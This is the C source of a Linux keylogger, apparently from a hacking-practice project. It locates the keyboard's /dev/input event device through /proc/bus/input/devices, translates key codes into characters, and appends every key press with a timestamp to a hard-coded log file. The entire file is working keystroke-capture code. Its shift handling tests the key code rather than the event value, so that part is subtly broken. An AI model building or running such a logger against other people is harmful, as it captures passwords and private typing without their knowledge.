#include "../include/logger.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <errno.h>
#include <string.h>
#include <time.h>

/**
 * Maps a key code to its corresponding string representation.
 *
 * @param code The key code to map.
 * @param mods The modifier state.
 * @return The string representation of the key.
 */

const char *key_map(unsigned int code, const modifier_state_t *mods) {
    
    static char key_str_buffer[32];

    // Handle alphanumeric and common symbols based on Shift and Caps Lock
    if (mods->shift_active && !mods->caps_lock_on) { // Shift is down, Caps Lock is off
        switch (code) {
            case KEY_A: return "A";
            case KEY_B: return "B";
            case KEY_C: return "C";
            case KEY_D: return "D";
            case KEY_E: return "E";
            case KEY_F: return "F";
            case KEY_G: return "G";
            case KEY_H: return "H";
            case KEY_I: return "I";
            case KEY_J: return "J";
            case KEY_K: return "K";
            case KEY_L: return "L";
            case KEY_M: return "M";
            case KEY_N: return "N";
            case KEY_O: return "O";
            case KEY_P: return "P";
            case KEY_Q: return "Q";
            case KEY_R: return "R";
            case KEY_S: return "S";
            case KEY_T: return "T";
            case KEY_U: return "U";
            case KEY_V: return "V";
            case KEY_W: return "W";
            case KEY_X: return "X";
            case KEY_Y: return "Y";
            case KEY_Z: return "Z";
            case KEY_1: return "!";
            case KEY_2: return "@";
            case KEY_3: return "#";
            case KEY_4: return "$";
            case KEY_5: return "%";
            case KEY_6: return "^";
            case KEY_7: return "&";
            case KEY_8: return "*";
            case KEY_9: return "(";
            case KEY_0: return ")";
            case KEY_MINUS: return "_";
            case KEY_EQUAL: return "+";
            case KEY_LEFTBRACE: return "{";
            case KEY_RIGHTBRACE: return "}";
            case KEY_BACKSLASH: return "|";
            case KEY_SEMICOLON: return ":";
            case KEY_APOSTROPHE: return "\"";
            case KEY_GRAVE: return "~";
            case KEY_COMMA: return "<";
            case KEY_DOT: return ">";
            case KEY_SLASH: return "?";
            case KEY_BACKSPACE: return "[BACKSPACE]";
            case KEY_TAB: return "[TAB]";
            case KEY_ENTER: return "[ENTER]";
            case KEY_SPACE: return "[SPACE]";
            default: break; // Fall through to unshifted or special keys
        }
    } else if (!mods->shift_active && mods->caps_lock_on) { // Shift is up, Caps Lock is on
        switch (code) {
            case KEY_A: return "A";
            case KEY_B: return "B";
            case KEY_C: return "C";
            case KEY_D: return "D";
            case KEY_E: return "E";
            case KEY_F: return "F";
            case KEY_G: return "G";
            case KEY_H: return "H";
            case KEY_I: return "I";
            case KEY_J: return "J";
            case KEY_K: return "K";
            case KEY_L: return "L";
            case KEY_M: return "M";
            case KEY_N: return "N";
            case KEY_O: return "O";
            case KEY_P: return "P";
            case KEY_Q: return "Q";
            case KEY_R: return "R";
            case KEY_S: return "S";
            case KEY_T: return "T";
            case KEY_U: return "U";
            case KEY_V: return "V";
            case KEY_W: return "W";
            case KEY_X: return "X";
            case KEY_Y: return "Y";
            case KEY_Z: return "Z";
            case KEY_BACKSPACE: return "[BACKSPACE]";
            case KEY_TAB: return "[TAB]";
            case KEY_ENTER: return "[ENTER]";
            case KEY_SPACE: return "[SPACE]";
            default: break; // Fall through to unshifted or special keys (numbers, symbols are unaffected by caps lock)
        }
    } else if (mods->shift_active && mods->caps_lock_on) { // Shift is down, Caps Lock is on (cancels each other for letters)
        switch (code) {
            case KEY_A: return "a";
            case KEY_B: return "b";
            case KEY_C: return "c";
            case KEY_D: return "d";
            case KEY_E: return "e";
            case KEY_F: return "f";
            case KEY_G: return "g";
            case KEY_H: return "h";
            case KEY_I: return "i";
            case KEY_J: return "j";
            case KEY_K: return "k";
            case KEY_L: return "l";
            case KEY_M: return "m";
            case KEY_N: return "n";
            case KEY_O: return "o";
            case KEY_P: return "p";
            case KEY_Q: return "q";
            case KEY_R: return "r";
            case KEY_S: return "s";
            case KEY_T: return "t";
            case KEY_U: return "u";
            case KEY_V: return "v";
            case KEY_W: return "w";
            case KEY_X: return "x";
            case KEY_Y: return "y";
            case KEY_Z: return "z";
            case KEY_1: return "!"; // Numbers/symbols still shifted
            case KEY_2: return "@";
            case KEY_3: return "#";
            case KEY_4: return "$";
            case KEY_5: return "%";
            case KEY_6: return "^";
            case KEY_7: return "&";
            case KEY_8: return "*";
            case KEY_9: return "(";
            case KEY_0: return ")";
            case KEY_MINUS: return "_";
            case KEY_EQUAL: return "+";
            case KEY_LEFTBRACE: return "{";
            case KEY_RIGHTBRACE: return "}";
            case KEY_BACKSLASH: return "|";
            case KEY_SEMICOLON: return ":";
            case KEY_APOSTROPHE: return "\"";
            case KEY_GRAVE: return "~";
            case KEY_COMMA: return "<";
            case KEY_DOT: return ">";
            case KEY_SLASH: return "?";
            case KEY_BACKSPACE: return "[BACKSPACE]";
            case KEY_TAB: return "[TAB]";
            case KEY_ENTER: return "[ENTER]";
            case KEY_SPACE: return "[SPACE]";
            default: break;
        }
    }

    // Default (unshifted, caps lock irrelevant for non-letters, or letters when caps lock is off)
    switch (code) {
        // Letters (lowercase if not shifted/caps-locked, otherwise handled above)
        case KEY_A: return "a"; case KEY_B: return "b"; case KEY_C: return "c";
        case KEY_D: return "d"; case KEY_E: return "e"; case KEY_F: return "f";
        case KEY_G: return "g"; case KEY_H: return "h"; case KEY_I: return "i";
        case KEY_J: return "j"; case KEY_K: return "k"; case KEY_L: return "l";
        case KEY_M: return "m"; case KEY_N: return "n"; case KEY_O: return "o";
        case KEY_P: return "p"; case KEY_Q: return "q"; case KEY_R: return "r";
        case KEY_S: return "s"; case KEY_T: return "t"; case KEY_U: return "u";
        case KEY_V: return "v"; case KEY_W: return "w"; case KEY_X: return "x";
        case KEY_Y: return "y"; case KEY_Z: return "z";

        // Numbers
        case KEY_1: return "1"; case KEY_2: return "2"; case KEY_3: return "3";
        case KEY_4: return "4"; case KEY_5: return "5"; case KEY_6: return "6";
        case KEY_7: return "7"; case KEY_8: return "8"; case KEY_9: return "9";
        case KEY_0: return "0";

        // Common Symbols
        case KEY_MINUS: return "-";
        case KEY_EQUAL: return "=";
        case KEY_LEFTBRACE: return "[";
        case KEY_RIGHTBRACE: return "]";
        case KEY_BACKSLASH: return "\\";
        case KEY_SEMICOLON: return ";";
        case KEY_APOSTROPHE: return "'";
        case KEY_GRAVE: return "`";
        case KEY_COMMA: return ",";
        case KEY_DOT: return ".";
        case KEY_SLASH: return "/";

        // Special Keys
        case KEY_SPACE: return " ";
        case KEY_ENTER: return "\n"; // Newline for Enter key
        case KEY_TAB: return "\t";   // Tab character for Tab key
        case KEY_BACKSPACE: return "[BACKSPACE]"; // Or implement backspace character logic if needed
        case KEY_CAPSLOCK: return "[CAPS LOCK]";
        case KEY_LEFTSHIFT: case KEY_RIGHTSHIFT: return "[SHIFT]";
        case KEY_LEFTCTRL: case KEY_RIGHTCTRL: return "[CTRL]";
        case KEY_LEFTALT: case KEY_RIGHTALT: return "[ALT]";
        case KEY_LEFTMETA: case KEY_RIGHTMETA: return "[SUPER]"; // Windows/Command key
        case KEY_ESC: return "[ESC]";

        // Function Keys
        case KEY_F1: return "[F1]"; case KEY_F2: return "[F2]"; case KEY_F3: return "[F3]";
        case KEY_F4: return "[F4]"; case KEY_F5: return "[F5]"; case KEY_F6: return "[F6]";
        case KEY_F7: return "[F7]"; case KEY_F8: return "[F8]"; case KEY_F9: return "[F9]";
        case KEY_F10: return "[F10]"; case KEY_F11: return "[F11]"; case KEY_F12: return "[F12]";

        // Arrow Keys
        case KEY_UP: return "[UP]";
        case KEY_DOWN: return "[DOWN]";
        case KEY_LEFT: return "[LEFT]";
        case KEY_RIGHT: return "[RIGHT]";

        // Navigation/Editing Keys
        case KEY_HOME: return "[HOME]";
        case KEY_END: return "[END]";
        case KEY_PAGEUP: return "[PAGE UP]";
        case KEY_PAGEDOWN: return "[PAGE DOWN]";
        case KEY_DELETE: return "[DELETE]";
        case KEY_INSERT: return "[INSERT]";

        // Numpad Keys (if present)
        case KEY_KP0: return "0"; case KEY_KP1: return "1"; case KEY_KP2: return "2";
        case KEY_KP3: return "3"; case KEY_KP4: return "4"; case KEY_KP5: return "5";
        case KEY_KP6: return "6"; case KEY_KP7: return "7"; case KEY_KP8: return "8";
        case KEY_KP9: return "9";
        case KEY_KPDOT: return ".";
        case KEY_KPSLASH: return "/";
        case KEY_KPASTERISK: return "*";
        case KEY_KPMINUS: return "-";
        case KEY_KPPLUS: return "+";
        case KEY_KPENTER: return "\n"; // Numpad Enter

        default:
            // For unknown keys, return a string with the hex code
            snprintf(key_str_buffer, sizeof(key_str_buffer), "[UNKNOWN: 0x%04x]", code);
            return key_str_buffer;
    }
}

/**
 * Retrieves the keyboard device and handler.
 *
 * @param pdevice The device name.
 * @param phandler The handler name.
 */
void get_handler(char *pdevice, char *phandler) {
    char device[MAX_SIZE] = "";
    char handler[MAX_SIZE] = "";
    char line[MAX_SIZE];

    const char *target_keyboards[] = {
        "AT Translated Set 2 keyboard",
        "Standard PS/2 Keyboard",
        "USB Keyboard",
        "Keyboard"};

    FILE *fptr = fopen("/proc/bus/input/devices", "r");
    if (!fptr) {
        perror("Fail to open the file");
        exit(EXIT_FAILURE);
    }

    while (fgets(line, sizeof(line), fptr)) {
        if (line[0] == 'N' && strstr(line, "Name=")) {
            strncpy(device, line, MAX_SIZE);
        }

        if (line[0] == 'H' && strstr(line, "Handlers=")) {
            strncpy(handler, line, MAX_SIZE);
            for (long unsigned int i = 0; i < sizeof(target_keyboards) / sizeof(target_keyboards[0]); i++) {
                if (strstr(device, target_keyboards[i])) {
                    char *token = strtok(handler, " ");
                    while (token) {
                        if (strncmp(token, "event", 5) == 0) {
                            strncpy(pdevice, target_keyboards[i], MAX_SIZE - 1);
                            snprintf(phandler, MAX_SIZE - 1, "/dev/input/%s", token);
                            fclose(fptr);
                            return;
                        }
                        token = strtok(NULL, " ");
                    }
                }
            }
            strcpy(device, "");
            strcpy(handler, "");
        }
    }

    fclose(fptr);
    fprintf(stderr, "Could not find the real keyboard handler.\n");
    return;
}

/**
 * Connects to the keyboard handler and listens for events.
 *
 * @param handler The handler name.
 * @param verbose Whether to print verbose output.
 */
void connect_handler(char *handler, int verbose) {
    int fd;
    struct input_event ev;
    ssize_t bytes_read;
    modifier_state_t modifiers;

    memset(&modifiers, 0, sizeof(modifier_state_t));

    fd = open(handler, O_RDONLY);

    if (fd == -1) {
        perror("Error opening event device");
        close(fd);
        exit(EXIT_FAILURE);
    }

    FILE *log_fp = fopen("/home/sanjay/Desktop/c_for_hackers/keytrace/logs/keytrace.txt", "a+");
    if (!log_fp) {
        perror("fail to open the log file");
        exit(EXIT_FAILURE);
    }
    if (verbose) {
        printf("Listening for keyboard events at [%s]\n to exit press CTRL + C\n", handler);
    }

    // logging the timestamp
    time_t rawtime;
    struct tm *timeinfo;
    char timestamp_buf[80];

    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strftime(timestamp_buf, sizeof(timestamp_buf), "[%c]", timeinfo);
    fprintf(log_fp,"%s\n",timestamp_buf);
    while (1) {
        bytes_read = read(fd, &ev, sizeof(ev));

        if (bytes_read == -1) {
            if (errno == EINTR) {
                continue;
            } else {
                perror("Error fail to read the input device");
                close(fd);
                exit(EXIT_FAILURE);
            }
        }
        if (bytes_read == sizeof(ev)) {
            if (ev.type == EV_KEY) {
                switch (ev.code) {
                case KEY_LEFTSHIFT:
                case KEY_RIGHTSHIFT:
                    modifiers.shift_active = (ev.code == 1);
                    break;
                case KEY_CAPSLOCK:
                    if (ev.value == 1) modifiers.caps_lock_on = !(modifiers.caps_lock_on);
                // add more if need
                default:
                    break;
                }

                if (ev.value == 1) {
                    const char *key = key_map(ev.code, &modifiers);
                    // logging to file
                    fprintf(log_fp, "%s",key);
                    fflush(log_fp);
                    if (verbose) printf("%s", key);
                }
            }
        }
    }
    close(fd);
    return;
}
